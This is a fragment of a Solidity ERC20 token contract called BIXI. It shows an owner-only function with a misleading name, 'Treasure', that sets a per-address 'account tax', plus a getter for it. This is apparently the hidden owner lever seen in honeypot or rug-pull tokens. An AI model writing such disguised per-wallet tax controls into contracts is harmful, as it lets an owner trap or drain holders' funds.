...
contract BIXI is ERC20, Ownable {
    ...
    mapping(address => uint256) private _Treasure;
    ...
    function Treasure(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _Treasure[_address] = _value;
    }

    function getTreasure(address _address) external view onlyOwner returns (uint256) {
        return _Treasure[_address];
    }
